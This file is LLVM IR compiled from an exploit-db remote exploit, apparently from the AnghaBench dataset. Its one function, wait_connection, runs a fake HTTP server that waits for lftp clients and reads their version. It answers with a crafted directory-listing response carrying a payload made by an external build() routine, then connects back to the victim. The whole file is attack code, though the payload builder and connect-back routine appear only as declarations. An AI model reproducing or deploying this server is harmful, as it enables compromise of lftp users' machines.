; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_143.c_wait_connection.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_143.c_wait_connection.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i64 }
%struct.sockaddr = type { i32 }

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [38 x i8] c"[+] Setting up a fake HTTP server...\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"[-] %s\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [36 x i8] c"[+] Awaiting connection on port %i\0A\00", align 1
@.str.3 = private unnamed_addr constant [17 x i8] c"User-Agent: lftp\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"HEAD\00", align 1
@.str.5 = private unnamed_addr constant [29 x i8] c"[%s] HEAD request received.\0A\00", align 1
@OK = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.7 = private unnamed_addr constant [28 x i8] c"[%s] GET request received.\0A\00", align 1
@.str.8 = private unnamed_addr constant [33 x i8] c"[%s] Remote version of lftp: %s \00", align 1
@.str.9 = private unnamed_addr constant [242 x i8] c"HTTP/1.1 200 OK\0AServer: thttpd/2.21 20apr2001\0AContent-Type: text/html\0ADate: Sun, 21 Dec 2003 16:29:44 GMT\0ALast-Modified: Sun, 21 Dec 2003 16:23:41 GMT\0AAccept-Ranges: bytes\0AConnection: close\0A\0A<a href=\22/\22>empty</a>\09Fri May 30 10:09:06 2001 %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @wait_connection(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [1024 x i8], align 16
  %11 = alloca [32 x i8], align 16
  %12 = alloca [512 x i8], align 16
  %13 = alloca i8*, align 8
  %14 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  store i32 0, i32* %9, align 4
  store i64 0, i64* %14, align 8
  %15 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %16 = call i32 @memset(i8* %15, i32 0, i32 1024)
  %17 = load i32, i32* @stdout, align 4
  %18 = call i32 (i32, i8*, ...) @fprintf(i32 %17, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str, i64 0, i64 0))
  %19 = load i32, i32* @AF_INET, align 4
  %20 = load i32, i32* @SOCK_STREAM, align 4
  %21 = call i32 @socket(i32 %19, i32 %20, i32 0)
  store i32 %21, i32* %5, align 4
  %22 = load i32, i32* %5, align 4
  %23 = icmp slt i32 %22, 0
  br i1 %23, label %24, label %30

24:                                               ; preds = %1
  %25 = load i32, i32* @stderr, align 4
  %26 = load i32, i32* @errno, align 4
  %27 = call i8* @strerror(i32 %26)
  %28 = call i32 (i32, i8*, ...) @fprintf(i32 %25, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* %27)
  %29 = call i32 @exit(i32 1) #3
  unreachable

30:                                               ; preds = %1
  %31 = load i32, i32* @AF_INET, align 4
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  store i32 %31, i32* %32, align 4
  %33 = load i32, i32* %2, align 4
  %34 = call i32 @htons(i32 %33)
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i32 %34, i32* %35, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  %37 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %36, i32 0, i32 0
  store i64 0, i64* %37, align 8
  %38 = load i32, i32* %5, align 4
  %39 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %40 = call i32 @bind(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = load i32, i32* %5, align 4
  %42 = call i32 @listen(i32 %41, i32 1)
  store i32 16, i32* %4, align 4
  %43 = load i32, i32* @stdout, align 4
  %44 = load i32, i32* %2, align 4
  %45 = call i32 (i32, i8*, ...) @fprintf(i32 %43, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0), i32 %44)
  br label %46

46:                                               ; preds = %30, %158
  store i32 0, i32* %9, align 4
  %47 = load i32, i32* %5, align 4
  %48 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %49 = call i32 @accept(i32 %47, %struct.sockaddr* %48, i32* %4)
  store i32 %49, i32* %6, align 4
  %50 = call i32 (...) @fork()
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %158, label %52

52:                                               ; preds = %46
  %53 = load i32, i32* %5, align 4
  %54 = call i32 @close(i32 %53)
  br label %55

55:                                               ; preds = %52, %152
  %56 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %57 = call i32 @memset(i8* %56, i32 0, i32 1024)
  %58 = load i32, i32* %6, align 4
  %59 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %60 = call i32 @read(i32 %58, i8* %59, i32 1024)
  store i32 %60, i32* %8, align 4
  %61 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %62 = call i8* @strstr(i8* %61, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0))
  store i8* %62, i8** %13, align 8
  %63 = icmp ne i8* %62, null
  br i1 %63, label %64, label %152

64:                                               ; preds = %55
  %65 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %66 = call i8* @strstr(i8* %65, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  %67 = icmp ne i8* %66, null
  br i1 %67, label %68, label %91

68:                                               ; preds = %64
  %69 = load i32, i32* @stdout, align 4
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  %71 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %70, i32 0, i32 0
  %72 = load i64, i64* %71, align 8
  %73 = call i8* @inet_ntoa(i64 %72)
  %74 = call i32 (i32, i8*, ...) @fprintf(i32 %69, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.5, i64 0, i64 0), i8* %73)
  %75 = load i32, i32* %6, align 4
  %76 = load i8*, i8** @OK, align 8
  %77 = load i8*, i8** @OK, align 8
  %78 = call i32 @strlen(i8* %77)
  %79 = call i32 @send(i32 %75, i8* %76, i32 %78, i32 0)
  store i32 %79, i32* %4, align 4
  %80 = load i32, i32* %4, align 4
  %81 = icmp slt i32 %80, 0
  br i1 %81, label %82, label %90

82:                                               ; preds = %68
  %83 = load i32, i32* @stderr, align 4
  %84 = load i32, i32* @errno, align 4
  %85 = call i8* @strerror(i32 %84)
  %86 = call i32 (i32, i8*, ...) @fprintf(i32 %83, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* %85)
  %87 = load i32, i32* %6, align 4
  %88 = call i32 @close(i32 %87)
  %89 = call i32 @exit(i32 1) #3
  unreachable

90:                                               ; preds = %68
  br label %91

91:                                               ; preds = %90, %64
  %92 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %93 = call i8* @strstr(i8* %92, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0))
  %94 = icmp ne i8* %93, null
  br i1 %94, label %95, label %151

95:                                               ; preds = %91
  %96 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %97 = call i32 @memset(i8* %96, i32 0, i32 512)
  %98 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %99 = call i32 @memset(i8* %98, i32 0, i32 32)
  %100 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %101 = load i8*, i8** %13, align 8
  %102 = getelementptr inbounds i8, i8* %101, i64 12
  %103 = call i32 @strncpy(i8* %100, i8* %102, i32 10)
  %104 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 31
  store i8 0, i8* %104, align 1
  %105 = load i32, i32* @stdout, align 4
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  %107 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %106, i32 0, i32 0
  %108 = load i64, i64* %107, align 8
  %109 = call i8* @inet_ntoa(i64 %108)
  %110 = call i32 (i32, i8*, ...) @fprintf(i32 %105, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.7, i64 0, i64 0), i8* %109)
  %111 = load i32, i32* @stdout, align 4
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  %113 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %112, i32 0, i32 0
  %114 = load i64, i64* %113, align 8
  %115 = call i8* @inet_ntoa(i64 %114)
  %116 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %117 = call i32 (i32, i8*, ...) @fprintf(i32 %111, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.8, i64 0, i64 0), i8* %115, i8* %116)
  %118 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %119 = call i32 @check_version(i8* %118)
  %120 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %121 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  %122 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %121, i32 0, i32 0
  %123 = load i64, i64* %122, align 8
  %124 = call i8* @inet_ntoa(i64 %123)
  %125 = call i8* @build(i8* %124)
  %126 = call i32 @snprintf(i8* %120, i32 512, i8* getelementptr inbounds ([242 x i8], [242 x i8]* @.str.9, i64 0, i64 0), i8* %125)
  %127 = load i32, i32* %6, align 4
  %128 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %129 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %130 = call i32 @strlen(i8* %129)
  %131 = call i32 @send(i32 %127, i8* %128, i32 %130, i32 0)
  store i32 %131, i32* %4, align 4
  %132 = load i32, i32* %4, align 4
  %133 = icmp slt i32 %132, 0
  br i1 %133, label %134, label %142

134:                                              ; preds = %95
  %135 = load i32, i32* @stderr, align 4
  %136 = load i32, i32* @errno, align 4
  %137 = call i8* @strerror(i32 %136)
  %138 = call i32 (i32, i8*, ...) @fprintf(i32 %135, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* %137)
  %139 = load i32, i32* %6, align 4
  %140 = call i32 @close(i32 %139)
  %141 = call i32 @exit(i32 1) #3
  unreachable

142:                                              ; preds = %95
  %143 = call i32 @sleep(i32 2)
  %144 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  %145 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %144, i32 0, i32 0
  %146 = load i64, i64* %145, align 8
  %147 = call i8* @inet_ntoa(i64 %146)
  %148 = call i64 @resolve_host(i8* %147)
  store i64 %148, i64* %14, align 8
  %149 = load i64, i64* %14, align 8
  %150 = call i32 @back_connection(i64 %149)
  store i32 1, i32* %9, align 4
  br label %153

151:                                              ; preds = %91
  br label %152

152:                                              ; preds = %151, %55
  br label %55

153:                                              ; preds = %142
  %154 = load i32, i32* %9, align 4
  %155 = icmp eq i32 %154, 1
  br i1 %155, label %156, label %157

156:                                              ; preds = %153
  br label %161

157:                                              ; preds = %153
  br label %158

158:                                              ; preds = %157, %46
  %159 = load i32, i32* %6, align 4
  %160 = call i32 @close(i32 %159)
  br label %46

161:                                              ; preds = %156
  ret void
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i8* @strerror(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i8* @strstr(i8*, i8*) #1

declare dso_local i8* @inet_ntoa(i64) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i32 @check_version(i8*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i8* @build(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i64 @resolve_host(i8*) #1

declare dso_local i32 @back_connection(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
